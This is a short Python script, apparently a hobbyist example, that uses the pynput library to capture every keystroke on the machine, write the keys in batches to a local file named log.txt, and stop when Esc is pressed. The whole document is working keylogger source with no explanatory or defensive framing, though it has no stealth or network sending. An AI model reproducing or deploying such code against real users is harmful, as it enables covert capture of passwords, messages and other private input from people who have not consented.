from pynput.keyboard import Key, Listener

keys=[]

def on_press(key):
    global keys
    if key == Key.space:
        key=" "
    elif key == Key.enter:
        key="\n"
    elif key == Key.backspace:
        key=" Backspace "
    keys.append(key)
    if len(keys) > 10:
        write_to_file(keys)
        keys = []
    print(key)

def write_to_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            key = str(key).replace("'", "")
            f.write(key)
    f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
